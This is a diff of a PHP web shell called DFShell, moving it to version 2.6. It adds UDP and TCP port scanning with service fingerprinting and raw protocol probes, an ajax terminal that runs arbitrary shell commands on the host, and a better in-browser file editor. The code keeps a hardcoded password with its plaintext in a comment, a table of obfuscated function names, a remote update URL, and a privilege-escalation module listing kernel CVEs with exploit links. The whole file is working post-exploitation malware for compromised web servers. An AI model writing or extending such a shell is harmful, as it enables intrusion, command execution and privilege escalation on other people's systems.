@@ -6,7 +6,7 @@ error_reporting(0);
 
 // creating session
 session_start();
-$DFShell_Ver = 2.5;
+$DFShell_Ver = 2.6;
 $DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
 $DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
 "stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents","posix_getpwuid"); // $GLOBALS['DFSyntax']
@@ -39,14 +39,14 @@ class DFShell{
     private $error   = false;   
 
     static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DF_Malaysia@1337$
-    static protected $remote_url = "https://raw.githubusercontent.com/EagleTube/DFS/main/contents";
+    static protected $remote_url = "https://github.com/Ap0dexMe0/DFS/tree/main/contents";
     
     public function __construct(){
         $_SESSION['need_update'] = false;
         $_SESSION['latest'] = $GLOBALS['DFShell_Ver'];
         // v2.3: resilient update check (3s timeout, never fatal if allow_url_fopen off / offline)
         try{
-            $ctx = stream_context_create(array('http'=>array('timeout'=>3,'user_agent'=>'DFS/2.3')));
+            $ctx = stream_context_create(array('http'=>array('timeout'=>3,'user_agent'=>'DFS/2.6')));
             $ver = @$GLOBALS['DFSyntax'][0](self::$remote_url . "/version.txt", false, $ctx);
             if($ver!==false && $ver!==""){
                 $ver = trim($ver);
@@ -143,11 +143,110 @@ class DFShell{
     }
 
     public function DFSPortService($port){
-        static $map = array(21=>'FTP',22=>'SSH',23=>'Telnet',25=>'SMTP',53=>'DNS',67=>'DHCP',69=>'TFTP',
-        80=>'HTTP',110=>'POP3',135=>'MSRPC',139=>'NetBIOS',143=>'IMAP',161=>'SNMP',389=>'LDAP',
-        443=>'HTTPS',445=>'SMB',1433=>'MSSQL',1521=>'Oracle',3306=>'MySQL',3389=>'RDP',5432=>'PostgreSQL',
-        5900=>'VNC',6379=>'Redis',8080=>'HTTP-Alt',8443=>'HTTPS-Alt',27017=>'MongoDB');
+        static $map = array(7=>'Echo',19=>'Chargen',21=>'FTP',22=>'SSH',23=>'Telnet',25=>'SMTP',53=>'DNS',
+        67=>'DHCP-srv',68=>'DHCP-cli',69=>'TFTP',80=>'HTTP',110=>'POP3',111=>'RPCbind',123=>'NTP',
+        135=>'MSRPC',137=>'NetBIOS-ns',138=>'NetBIOS-dgm',139=>'NetBIOS',143=>'IMAP',161=>'SNMP',162=>'SNMP-trap',
+        389=>'LDAP',443=>'HTTPS',445=>'SMB',500=>'IKE',514=>'Syslog',520=>'RIP',623=>'IPMI',636=>'LDAPS',
+        1433=>'MSSQL',1521=>'Oracle',1900=>'SSDP',3306=>'MySQL',3389=>'RDP',4500=>'IPsec-NAT',5353=>'mDNS',
+        5432=>'PostgreSQL',5900=>'VNC',6379=>'Redis',8080=>'HTTP-Alt',8443=>'HTTPS-Alt',
+        11211=>'Memcached',27017=>'MongoDB');
         return $map[$port] ?? '';
+    }
+
+    // v2.6: active service fingerprinting — send a protocol probe, match the reply
+    public function DFSFingerprint($host,$port,$banner='',$proto='tcp'){
+        $b = strtolower((string)$banner);
+        // fast path: banner already tells us
+        $hints = array('ssh-'=>'SSH','220 '=>'FTP/SMTP','smtp'=>'SMTP','esmtp'=>'SMTP','ftp'=>'FTP',
+            'imap'=>'IMAP','pop3'=>'POP3','http'=>'HTTP','server:'=>'HTTP','mysql'=>'MySQL',
+            'redis'=>'Redis','memcached'=>'Memcached','microsoft'=>'SMB/RDP','rdp'=>'RDP','vnc'=>'VNC');
+        foreach($hints as $k=>$v){ if($b!=="" && strpos($b,$k)!==false){ return $v; } }
+
+        // active probes per port (TCP only — cheap, one shot each)
+        $probes = array();
+        if($proto==='tcp'){
+            if(in_array($port,array(80,8080,8000,8888,8443,443,3128,8008))){
+                $probes[] = "HEAD / HTTP/1.0\r\nHost: $host\r\n\r\n";
+            }elseif($port==25 || $port==587){
+                $probes[] = "EHLO dfs\r\n";
+            }elseif($port==21){
+                $probes[] = "FEAT\r\n";
+            }elseif($port==110){
+                $probes[] = "CAPA\r\n";
+            }elseif($port==143){
+                $probes[] = "A001 CAPABILITY\r\n";
+            }elseif($port==6379){
+                $probes[] = "*1\r\n\$4\r\nPING\r\n";
+            }elseif($port==11211){
+                $probes[] = "version\r\n";
+            }elseif($port==3306 || $port==5432 || $port==1433 || $port==1521 || $port==27017){
+                $probes[] = "\r\n"; // these usually banner on connect already
+            }else{
+                $probes[] = "HEAD / HTTP/1.0\r\n\r\n"; // generic: catches HTTP on odd ports
+            }
+        }
+        foreach((array)$probes as $pb){
+            $fp = @$GLOBALS['DFSyntax'][6]($host,$port,$errno,$errstr,1.5);
+            if(!$fp){ continue; }
+            @stream_set_timeout($fp,2);
+            @fwrite($fp,$pb);
+            $resp = (string)@fread($fp,1024);
+            @fclose($fp);
+            $resp = trim(preg_replace('/[\r\n\t]+/',' | ',$resp));
+            if($resp===""){ continue; }
+            $rl = strtolower($resp);
+            if(strpos($rl,'ssh-')!==false){ return 'SSH ('.substr($resp,0,60).')'; }
+            if(strpos($rl,'http/')!==false || strpos($rl,'server:')!==false){ return 'HTTP ('.substr($resp,0,80).')'; }
+            if(strpos($rl,'220')!==false && strpos($rl,'smtp')!==false){ return 'SMTP ('.substr($resp,0,60).')'; }
+            if(strpos($rl,'220')!==false){ return 'FTP ('.substr($resp,0,60).')'; }
+            if(strpos($rl,'+ok')!==false){ return 'POP3 ('.substr($resp,0,60).')'; }
+            if(strpos($rl,'* capability')!==false || strpos($rl,'imap')!==false){ return 'IMAP ('.substr($resp,0,60).')'; }
+            if(strpos($rl,'+pong')!==false || strpos($rl,'redis')!==false){ return 'Redis'; }
+            if(strpos($rl,'version')!==false && strlen($resp)<40){ return 'Memcached ('.$resp.')'; }
+            return substr($resp,0,80);
+        }
+        return '';
+    }
+
+    // v2.6: UDP scan via udp:// sockets + protocol probes (DNS, SNMP, NTP, NetBIOS)
+    public function DFSUdpScan($host,$ports,$timeout=1.5){
+        $host = trim($host);
+        $timeout = max(0.5,min(4.0,floatval($timeout)));
+        $open = array(); $closed = 0;
+        @set_time_limit(0);
+        // canned probes: DNS status request, SNMPv1 public get, NTP client req, NetBIOS name query
+        $dnsProbe  = "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01";
+        $snmpProbe = "\x30\x26\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x71\x5e\x46\x08\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00";
+        $ntpProbe  = "\x1b".str_repeat("\x00",47);
+        $nbProbe   = "\xa2\xa2\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x20\x43\x4b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x21\x00\x01";
+        foreach((array)$ports as $port){
+            $port = intval($port);
+            $t0 = microtime(true);
+            $probe = "";
+            if($port==53){ $probe = $dnsProbe; }
+            elseif($port==161 || $port==162){ $probe = $snmpProbe; }
+            elseif($port==123){ $probe = $ntpProbe; }
+            elseif($port==137){ $probe = $nbProbe; }
+            $fp = @fsockopen("udp://".$host,$port,$errno,$errstr,$timeout);
+            if(!$fp){ $closed++; continue; }
+            @stream_set_timeout($fp,(int)ceil($timeout));
+            if($probe!==""){ @fwrite($fp,$probe); }
+            else{ @fwrite($fp,"\r\n"); }
+            $resp = (string)@fread($fp,1024);
+            $ms = round((microtime(true)-$t0)*1000);
+            @fclose($fp);
+            $resp = trim($resp);
+            if($resp!==""){
+                $fp2 = 'open (reply '.strlen($resp).'B)';
+                $svc = $this->DFSPortService($port);
+                $open[] = array('port'=>$port,'service'=>$svc,'ms'=>$ms,'banner'=>$fp2,'proto'=>'udp');
+            }else{
+                // UDP is connectionless: no reply = open|filtered, count separately
+                $svc = $this->DFSPortService($port);
+                $open[] = array('port'=>$port,'service'=>$svc,'ms'=>$ms,'banner'=>'no reply (open|filtered)','proto'=>'udp');
+            }
+        }
+        return array('host'=>$host,'open'=>$open,'closed'=>$closed,'total'=>count($ports));
     }
 
     public function DFSPopupMSG($no,$title,$msg,$foot,$x){
@@ -468,8 +567,8 @@ class DFShell{
         return array('base'=>$base,'live'=>$live);
     }
 
-    // v2.3: TCP connect port scan + banner grab
-    public function DFSPortScan($host,$ports,$timeout=0.5,$grabBanner=true){
+    // v2.3: TCP connect port scan + banner grab (v2.6: + fingerprinting)
+    public function DFSPortScan($host,$ports,$timeout=0.5,$grabBanner=true,$fingerprint=false){
         $host = trim($host);
         $timeout = max(0.15,min(3.0,floatval($timeout)));
         $open = array(); $closed = 0;
@@ -489,7 +588,12 @@ class DFShell{
                     if(strlen($banner)>180){ $banner = substr($banner,0,180).'...'; }
                 }
                 @fclose($fp);
-                $open[] = array('port'=>$port,'service'=>$this->DFSPortService($port),'ms'=>$ms,'banner'=>$banner);
+                $fpnt = '';
+                if($fingerprint){
+                    $fpnt = $this->DFSFingerprint($host,$port,$banner,'tcp');
+                    if($fpnt!=="" && $banner===""){ $banner = $fpnt; $fpnt = ''; }
+                }
+                $open[] = array('port'=>$port,'service'=>$this->DFSPortService($port),'ms'=>$ms,'banner'=>$banner,'fp'=>$fpnt,'proto'=>'tcp');
             }else{ $closed++; }
         }
         return array('host'=>$host,'open'=>$open,'closed'=>$closed,'total'=>count($ports));
@@ -693,27 +797,170 @@ class DFShell{
             case "edit":
                 $slashtype = $this->DFSSlash();
                 $this->DFSCurrent($slashtype);
-                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
+                // join dir + file with exactly one separator (dfp usually ends with one, but don't trust it)
+                $editDir = $this->Dec(($this->query[0])); $editFile = $this->Dec(($this->query[1]));
+                $pathfile = rtrim($editDir,"/\\") . $slashtype . ltrim($editFile,"/\\");
                 $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
-                if(!isset($GLOBALS['DFConfig'][1]['dfedit'])){
+                $backLink = "?dfp=".urlencode($this->query[0])."&dff=".urlencode(($this->query[1] ?? ''));
+                // hardened load: guard stat + read separately so empty/unicode files load and failures land on the error path
+                $rawContent = false;
+                if(is_file($pathfile) && is_readable($pathfile)){
+                    $rawContent = @$GLOBALS['DFSyntax'][0]($pathfile);
+                }
+                if($rawContent===false){
+                    // don't open an empty editor on a bad path — Save would create/truncate a stray file
                     echo "<section class='editform'>";
-                    echo "<form action='' method='POST'>";
-                    echo "<textarea class='editcontent' name='editx'>";
-                    echo htmlspecialchars($GLOBALS['DFSyntax'][0]($pathfile));
-                    echo "</textarea>";
-                    echo "<input type='submit' name='dfedit' value='Save'>";
+                    echo "<h3>Edit File <small style='color:#888'>(v2.6)</small></h3>";
+                    echo "<p style='color:red'>Cannot open file: ".$this->DFSH($pathfile)."</p>";
+                    echo "<div class='dfs-edbtns'><a href='$backLink'><button type='button'>Back</button></a></div>";
+                    echo "</section>";
+                }elseif(isset($GLOBALS['DFConfig'][1]['dfajaxsave'])){
+                    // v2.6 ajax save endpoint — raw result only, no reload so cursor/content survive
+                    while(ob_get_level()){ @ob_end_clean(); }
+                    $pto = @fopen($pathfile,'w');
+                    if($pto){
+                        $w = @fwrite($pto,$GLOBALS['DFConfig'][1]['editx']);
+                        @fclose($pto);
+                        echo ($w===false) ? "ERR:write failed" : "OK";
+                    }else{
+                        echo "ERR:cannot open file for writing (permission?)";
+                    }
+                    exit;
+                }elseif(!isset($GLOBALS['DFConfig'][1]['dfedit'])){
+                    $editContent = htmlspecialchars((string)$rawContent, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+                    $ro = is_writable($pathfile) ? "" : " <span class='ro'>[read-only]</span>";
+                    echo "<section class='editform'>";
+                    echo "<h3>Edit File <small style='color:#888'>(v2.6)</small></h3>";
+                    echo "<p class='dfs-edfile'>".$this->DFSH($pathfile)." &nbsp;(".$this->DFSFormat(@filesize($pathfile)).")$ro</p>";
+                    echo "<div class='dfs-edbar'><span id='dfs-edpos'>Ln 1, Col 1</span> &nbsp;|&nbsp; <span id='dfs-edcount'></span> &nbsp;|&nbsp; <span id='dfs-edmsg'></span> &nbsp;|&nbsp; Tab = 4 spaces &nbsp;|&nbsp; Ctrl+S = save</div>";
+                    echo "<form id='dfs-edform' action='' method='POST'>";
+                    echo "<div class='dfs-edwrap'><div class='dfs-gutter' id='dfs-gutter'><div class='dfs-gutter-inner' id='dfs-gutter-inner'>1</div></div>";
+                    echo "<textarea class='dfs-ed' id='dfs-ed' name='editx' wrap='off' spellcheck='false'>";
+                    echo $editContent;
+                    echo "</textarea></div>";
+                    echo "<div class='dfs-edbtns'><input type='submit' name='dfedit' value='Save'>";
+                    echo "<a href='$backLink'><button type='button'>Cancel</button></a></div>";
                     echo "</form></section>";
+                    echo "<script>
+                    (function(){
+                        var ta=document.getElementById('dfs-ed'),inner=document.getElementById('dfs-gutter-inner'),
+                            pos=document.getElementById('dfs-edpos'),cnt=document.getElementById('dfs-edcount'),
+                            msg=document.getElementById('dfs-edmsg'),form=document.getElementById('dfs-edform'),
+                            built=0,tick=false,dirty=false,nativeSubmit=false;
+                        function paint(){
+                            tick=false;
+                            var val=ta.value,lines=val.split('\\n');
+                            if(built!==lines.length){
+                                var h='';
+                                for(var i=1;i<=lines.length;i++){ h+=i+'<br>'; }
+                                inner.innerHTML=h;
+                                built=lines.length;
+                            }
+                            inner.style.transform='translateY('+(-ta.scrollTop)+'px)';
+                            var upto=ta.selectionStart,l=val.substr(0,upto).split('\\n');
+                            pos.textContent='Ln '+l.length+', Col '+(l[l.length-1].length+1);
+                            cnt.textContent=lines.length+' lines, '+val.length+' chars';
+                        }
+                        function req(){ if(!tick){ tick=true; if(window.requestAnimationFrame){ window.requestAnimationFrame(paint); } else { paint(); } } }
+                        function status(t,bad){ msg.textContent=t; msg.style.color=bad?'#f70000':'#69e01f'; }
+                        function edReplace(text,s,e){
+                            if(typeof ta.setRangeText==='function'){ ta.setRangeText(text,s,e,'end'); }
+                            else{
+                                ta.value=ta.value.substring(0,s)+text+ta.value.substring(e);
+                                ta.selectionStart=ta.selectionEnd=s+text.length;
+                            }
+                            dirty=true; req();
+                        }
+                        function edShift(dir){
+                            var v=ta.value,s=ta.selectionStart,e=ta.selectionEnd,
+                                bs=v.lastIndexOf('\\n',s-1)+1,be=v.indexOf('\\n',e);
+                            if(be===-1){ be=v.length; }
+                            var old= v.substring(bs,be).split('\\n'),starts=[],p=bs,i;
+                            for(i=0;i<old.length;i++){ starts.push(p); p+=old[i].length+1; }
+                            var add=[],nl=old.slice(),m,m2;
+                            for(i=0;i<old.length;i++){
+                                if(dir>0){ nl[i]='    '+old[i]; add.push(4); }
+                                else{
+                                    m=/^(?:    |\\t)/.exec(old[i]);
+                                    if(m){ nl[i]=old[i].substring(m[0].length); add.push(-m[0].length); }
+                                    else{ m2=/^ {1,3}/.exec(old[i]); if(m2){ nl[i]=old[i].substring(m2[0].length); add.push(-m2[0].length); } else { add.push(0); } }
+                                }
+                            }
+                            function shiftPos(pos0){
+                                var d=0,k;
+                                for(k=0;k<starts.length;k++){
+                                    if(starts[k]<pos0||(starts[k]===pos0&&add[k]>0)){ d+=add[k]; }
+                                }
+                                return pos0+d;
+                            }
+                            var ns=shiftPos(s),ne=shiftPos(e),nb=nl.join('\\n');
+                            if(typeof ta.setRangeText==='function'){ ta.setRangeText(nb,bs,be,'select'); }
+                            else{ ta.value=v.substring(0,bs)+nb+v.substring(be); }
+                            var lo=bs,hi=bs+nb.length;
+                            ta.selectionStart=Math.max(lo,Math.min(hi,ns));
+                            ta.selectionEnd=Math.max(lo,Math.min(hi,ne));
+                            dirty=true; req(); ta.focus();
+                        }
+                        function dfsEdSave(){
+                            if(!(window.fetch&&window.FormData)){ nativeSubmit=true; form.submit(); return false; }
+                            var fd=new FormData();
+                            fd.append('editx',ta.value); fd.append('dfedit','Save'); fd.append('dfajaxsave','1');
+                            status('saving...');
+                            fetch(window.location.href,{method:'POST',body:fd,credentials:'same-origin'}).then(function(r){ return r.text(); }).then(function(t){
+                                t=t||'';
+                                // our OK/ERR marker is always the last thing echoed before exit,
+                                // even if the page template already flushed into the response
+                                if(/(^|[\\r\\n])OK\\s*$/.test(t)){ dirty=false; paint(); var d=new Date(),p2=function(n){ return (n<10?'0':'')+n; }; status('saved '+p2(d.getHours())+':'+p2(d.getMinutes())+':'+p2(d.getSeconds())); }
+                                else{ var m=/ERR:([^\\r\\n]*)/.exec(t); status('save failed',true); if(window.Swal){ Swal.fire({icon:'error',title:'Save failed',text:(m&&m[1])?m[1]:'unknown error'}); } }
+                            }).catch(function(){ nativeSubmit=true; form.submit(); });
+                            return false;
+                        }
+                        ta.addEventListener('input',function(){ dirty=true; req(); });
+                        ta.addEventListener('scroll',req);
+                        ta.addEventListener('keyup',req);
+                        ta.addEventListener('click',req);
+                        if(window.addEventListener){ window.addEventListener('resize',req); }
+                        ta.addEventListener('keydown',function(e){
+                            if(e.isComposing||e.keyCode===229){ return; }
+                            if(e.key==='Tab'){
+                                e.preventDefault();
+                                var s0=ta.selectionStart,e0=ta.selectionEnd;
+                                if(e.shiftKey){ edShift(-1); }
+                                else if(s0!==e0&&ta.value.substring(s0,e0).indexOf('\\n')!==-1){ edShift(1); }
+                                else{ edReplace('    ',s0,e0); ta.focus(); }
+                            }
+                            else if(e.key==='Enter'&&!e.ctrlKey&&!e.metaKey&&!e.shiftKey){
+                                e.preventDefault();
+                                var s1=ta.selectionStart,e1=ta.selectionEnd,v1=ta.value,
+                                    ls=v1.lastIndexOf('\\n',s1-1)+1,
+                                    ind=(/^[ \\t]*/.exec(v1.substring(ls,s1))||[''])[0];
+                                edReplace('\\n'+ind,s1,e1); ta.focus();
+                            }
+                            else if((e.ctrlKey||e.metaKey)&&(e.key==='s'||e.key==='S')){ e.preventDefault(); dfsEdSave(); }
+                        });
+                        form.addEventListener('submit',function(ev){ if(!nativeSubmit&&(window.fetch&&window.FormData)){ ev.preventDefault(); dfsEdSave(); } else { dirty=false; } });
+                        if(window.addEventListener){ window.addEventListener('beforeunload',function(e){ if(dirty){ e.preventDefault(); e.returnValue=''; } }); }
+                        paint();
+                    })();
+                    </script>";
                 }else{
-                    $pto = fopen($pathfile,'w');
-                    fwrite($pto,$GLOBALS['DFConfig'][1]['editx']);
-                    fclose($pto);
-                    $this->DFSPopupMSG(3,null,"Saved!",null,true);
+                    $pto = @fopen($pathfile,'w');
+                    if($pto){
+                        $w = @fwrite($pto,$GLOBALS['DFConfig'][1]['editx']);
+                        @fclose($pto);
+                        if($w===false){ $this->DFSPopupMSG(4,null,"Save failed (write error)",null,true); }
+                        else{ $this->DFSPopupMSG(3,null,"Saved!",null,true); }
+                    }else{
+                        $this->DFSPopupMSG(4,null,"Save failed (permission?)",null,true);
+                    }
                 }
             break;
             case "view":
                 $slashtype = $this->DFSSlash();
                 $this->DFSCurrent($slashtype);
-                $pathfile = $this->Dec(($this->query[0])) . $this->Dec(($this->query[1]));
+                // same separator-safe join as edit (view hosts the Edit button)
+                $viewDir = $this->Dec(($this->query[0])); $viewFile = $this->Dec(($this->query[1]));
+                $pathfile = rtrim($viewDir,"/\\") . $slashtype . ltrim($viewFile,"/\\");
                 $pathfile = $this->Dec($this->DFSDirFilter($pathfile));
                 echo "<p id='sshows'><span id='fnameshow'>Filename -> </span><span id='fnameshow1'>".$this->DFSH($this->Dec(($this->query[1])))."</span></p>";
                 echo "<section class='sources'>";
@@ -758,6 +1005,12 @@ class DFShell{
             case "cmd":
                 $slashtype = $this->DFSSlash();
                 $this->DFSCurrent($slashtype);
+                // v2.6: ajax endpoint — POST dfajax=1 + dfscmd, returns raw output only
+                if(isset($GLOBALS['DFConfig'][1]['dfajax']) && isset($GLOBALS['DFConfig'][1]['dfscmd'])){
+                    while(ob_get_level()){ @ob_end_clean(); }
+                    $this->DFSExecute($GLOBALS['DFConfig'][1]['dfscmd']);
+                    exit;
+                }
                 // v2.3: show working dir + available executor
                 $cwd = isset($GLOBALS['DFConfig'][0]['dfp']) ? $this->Dec($GLOBALS['DFConfig'][0]['dfp']) : getcwd();
                 $avail = 'system';
@@ -768,15 +1021,40 @@ class DFShell{
                 $lastCmd = $GLOBALS['DFConfig'][1]['dfscmd'] ?? '';
                 echo "<section id='cmd_area'>";
                 echo "<p style='color:#FFD700;font-size:13px'>cwd: ".$this->DFSH($cwd)." &nbsp;|&nbsp; exec: <b>".$this->DFSH($avail)."</b></p>";
+                // v2.6: ajax terminal (no page reload) — classic form kept below as fallback
+                echo "<div id='ajaxterm' style='background:#000;border:1px solid #4a3d05;border-radius:8px;padding:10px;max-height:300px;overflow-y:auto;font-family:monospace;font-size:12px;color:#ddd;margin-bottom:8px'><div style='color:#666'>Ajax terminal ready — type a command below. History: up/down arrows.</div></div>";
+                echo "<form id='ajaxform' action='' method='POST' autocomplete='OFF' onsubmit='return dfsAjaxRun()'><input id='ajaxinput' type='text' placeholder='whoami (ajax, no reload)' autofocus style='width:100%'></form>";
+                echo "<script>
+                var dfsHist=[],dfsHi=-1;
+                function dfsAjaxRun(){
+                    var inp=document.getElementById('ajaxinput'),term=document.getElementById('ajaxterm');
+                    var cmd=inp.value; if(!cmd){return false;}
+                    dfsHist.push(cmd); dfsHi=dfsHist.length;
+                    term.innerHTML+=\"<div><span style='color:#FFD700'>&gt; </span>\"+cmd.replace(/&/g,'&amp;').replace(/</g,'&lt;')+\"</div>\";
+                    inp.value=''; term.scrollTop=term.scrollHeight;
+                    var fd=new FormData(); fd.append('dfscmd',cmd); fd.append('dfajax','1');
+                    fetch(window.location.href,{method:'POST',body:fd,credentials:'same-origin'}).then(function(r){return r.text();}).then(function(t){
+                        term.innerHTML+=\"<pre style='margin:2px 0 8px;color:#69e01f;white-space:pre-wrap'>\"+(t.replace(/&/g,'&amp;').replace(/</g,'&lt;')||'(no output)')+\"</pre>\";
+                        term.scrollTop=term.scrollHeight;
+                    }).catch(function(e){ term.innerHTML+=\"<div style='color:red'>request failed</div>\"; });
+                    return false;
+                }
+                document.getElementById('ajaxinput').addEventListener('keydown',function(e){
+                    if(e.key==='ArrowUp'&&dfsHist.length){e.preventDefault();if(dfsHi>0)dfsHi--;this.value=dfsHist[dfsHi]||'';}
+                    if(e.key==='ArrowDown'&&dfsHist.length){e.preventDefault();if(dfsHi<dfsHist.length-1)dfsHi++;else{dfsHi=dfsHist.length;this.value='';return;}this.value=dfsHist[dfsHi]||'';}
+                });
+                </script>";
+                echo "<details style='margin-top:8px'><summary style='cursor:pointer;color:#666;font-size:12px'>Classic form (page reload fallback)</summary>";
                 echo "<form action='' method='POST' autocomplete='OFF'><textarea class='cmd_response' readonly='TRUE'>";
-                if(isset($GLOBALS['DFConfig'][1]['dfscmd']) && $lastCmd!==""){
+                if(isset($GLOBALS['DFConfig'][1]['dfscmd']) && $lastCmd!=="" && !isset($GLOBALS['DFConfig'][1]['dfajax'])){
                     ob_start();
                     $this->DFSExecute($lastCmd);
                     $o = ob_get_clean();
                     echo $this->DFSH($o);
                 }
-                echo "</textarea><br><input type='text' name='dfscmd' placeholder='whoami' autofocus value='".$this->DFSH($lastCmd)."'><br><button>Execute</button></form>";
-                echo "<p style='color:#666;font-size:12px'>Tip: new in v2.3 — try <b>?dfaction=netscan</b> and <b>?dfaction=portscan</b> for recon without shell.</p>";
+                echo "</textarea><br><input type='text' name='dfscmd' placeholder='whoami' value='".$this->DFSH($lastCmd)."'><br><button>Execute</button></form>";
+                echo "</details>";
+                echo "<p style='color:#666;font-size:12px'>Tip: new in v2.6 — ajax terminal above runs without reload. Try <b>?dfaction=netscan</b> and <b>?dfaction=portscan</b> for recon without shell.</p>";
                 echo "</section>";
             break;
             case "sym":
@@ -1286,29 +1564,44 @@ class DFShell{
             break;
             case "portscan":
                 $defTarget = $GLOBALS['DFConfig'][0]['target'] ?? ($_SERVER['SERVER_ADDR'] ?? '127.0.0.1');
-                echo "<section class='portscan'><h3>Port Scanner <small style='color:#888'>(v2.3)</small></h3>";
+                echo "<section class='portscan'><h3>Port Scanner <small style='color:#888'>(v2.6 — TCP/UDP + fingerprint)</small></h3>";
                 echo "<form action='' method='POST'><table>";
                 echo "<tr><td><label>Host : </label></td><td><input type='text' name='pshost' value='".$this->DFSH($_POST['pshost'] ?? $defTarget)."' placeholder='127.0.0.1'></td></tr>";
                 echo "<tr><td><label>Ports : </label></td><td><input type='text' name='psports' value='".$this->DFSH($_POST['psports'] ?? '21,22,23,25,53,80,110,143,443,445,3306,3389,8080,8443')."' placeholder='1-1000 or 80,443'></td></tr>";
+                echo "<tr><td><label>Proto : </label></td><td><select name='psproto'><option value='tcp'".(($_POST['psproto'] ?? 'tcp')==='tcp'?' selected':'').">TCP</option><option value='udp'".(($_POST['psproto'] ?? '')==='udp'?' selected':'').">UDP</option><option value='both'".(($_POST['psproto'] ?? '')==='both'?' selected':'').">Both</option></select></td></tr>";
                 echo "<tr><td><label>Timeout : </label></td><td><input type='text' name='pstimeout' value='".$this->DFSH($_POST['pstimeout'] ?? '0.5')."'></td></tr>";
-                echo "<tr><td></td><td><label style='font-size:12px'><input type='checkbox' name='psbanner' value='1' checked> Banner grab</label> <input type='submit' name='dfportscan' value='Scan'></td></tr>";
+                echo "<tr><td></td><td><label style='font-size:12px'><input type='checkbox' name='psbanner' value='1'".(isset($_POST['dfportscan']) && !isset($_POST['psbanner']) ? '' : ' checked')."> Banner grab</label> <label style='font-size:12px'><input type='checkbox' name='psfp' value='1'".(isset($_POST['psfp'])?' checked':'')."> Fingerprint</label> <input type='submit' name='dfportscan' value='Scan'></td></tr>";
                 echo "</table></form><div class='scanresults'>";
                 if(isset($GLOBALS['DFConfig'][1]['dfportscan'])){
                     $ports = $this->DFSParsePorts($GLOBALS['DFConfig'][1]['psports']);
                     if(empty($ports)){ echo "<p style='color:red'>No valid ports (max 2000, format e.g. 1-1000,8080).</p>"; }
                     else{
-                        $res = $this->DFSPortScan($GLOBALS['DFConfig'][1]['pshost'],$ports,$GLOBALS['DFConfig'][1]['pstimeout'],isset($GLOBALS['DFConfig'][1]['psbanner']));
-                        echo "<p>Host <b>".$this->DFSH($res['host'])."</b> — <b>".count($res['open'])."</b>/".$res['total']." open (".$res['closed']." closed/filtered)</p>";
-                        if(count($res['open'])){
-                            echo "<table class='scantable'><tr><th>Port</th><th>Service</th><th>Latency</th><th>Banner</th></tr>";
-                            foreach($res['open'] as $o){
-                                echo "<tr><td><b style='color:#69e01f'>".$o['port']."/open</b></td><td>".$this->DFSH($o['service'])."</td><td>".$o['ms']." ms</td><td>".$this->DFSH($o['banner'])."</td></tr>";
+                        $proto = $GLOBALS['DFConfig'][1]['psproto'] ?? 'tcp';
+                        $doFp = isset($GLOBALS['DFConfig'][1]['psfp']);
+                        $all = array();
+                        if($proto==='tcp' || $proto==='both'){
+                            $res = $this->DFSPortScan($GLOBALS['DFConfig'][1]['pshost'],$ports,$GLOBALS['DFConfig'][1]['pstimeout'],isset($GLOBALS['DFConfig'][1]['psbanner']),$doFp);
+                            $all = array_merge($all,$res['open']);
+                        }
+                        if($proto==='udp' || $proto==='both'){
+                            $ures = $this->DFSUdpScan($GLOBALS['DFConfig'][1]['pshost'],$ports,$GLOBALS['DFConfig'][1]['pstimeout']);
+                            $all = array_merge($all,$ures['open']);
+                        }
+                        echo "<p>Host <b>".$this->DFSH($GLOBALS['DFConfig'][1]['pshost'])."</b> [$proto] — <b>".count($all)."</b>/".count($ports)." open</p>";
+                        if(count($all)){
+                            echo "<table class='scantable'><tr><th>Port</th><th>Proto</th><th>Service</th><th>Latency</th><th>Banner / Fingerprint</th></tr>";
+                            foreach($all as $o){
+                                $pr = $o['proto'] ?? 'tcp';
+                                $extra = $this->DFSH($o['banner']);
+                                if(!empty($o['fp'])){ $extra .= ($extra!==""?" <span style='color:#4d7cff'>| ".$this->DFSH($o['fp'])."</span>":"<span style='color:#4d7cff'>".$this->DFSH($o['fp'])."</span>"); }
+                                echo "<tr><td><b style='color:#69e01f'>".$o['port']."/open</b></td><td>$pr</td><td>".$this->DFSH($o['service'])."</td><td>".$o['ms']." ms</td><td>$extra</td></tr>";
                             }
                             echo "</table>";
+                            if($proto==='udp'||$proto==='both'){ echo "<p style='color:#666;font-size:11px'>Note: UDP is connectionless — 'no reply (open|filtered)' means the port didn't refuse, could be open or filtered.</p>"; }
                         }else{ echo "<p style='color:orange'>All scanned ports closed/filtered.</p>"; }
                     }
                 }else{
-                    echo "<p style='color:#aaa'>TCP-connect scan with banner grab. Keep ranges &lt; 2000 ports to avoid timeouts.</p>";
+                    echo "<p style='color:#aaa'>TCP-connect + UDP scan with banner grab and service fingerprinting. Keep ranges &lt; 2000 ports to avoid timeouts.</p>";
                 }
                 echo "</div></section>";
             break;
@@ -1735,7 +2028,7 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
         return $contents;
     }
 
-    // ===== v2.5: AUTO LPE (Local Privilege Escalation) =====
+    // ===== v2.6: AUTO LPE (Local Privilege Escalation) =====
     // Cross-platform (Linux + Windows) privilege escalation enumeration.
     // Modular design — each technique is self-contained and reports its own status.
 
@@ -2020,6 +2313,21 @@ Document Root : ".$this->DFSH($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT'] ?? '')." 
                 'min'=>'3.10.0','max'=>'6.2.1',
                 'desc'=>'Race condition in vsock transport reassignment',
                 'exploit'=>'https://github.com/PaloAltoNetworks/Unit42'),
+            // Looney Tunables - CVE-2023-4911
+            array('cve'=>'CVE-2023-4911','name'=>'Looney Tunables (glibc)',
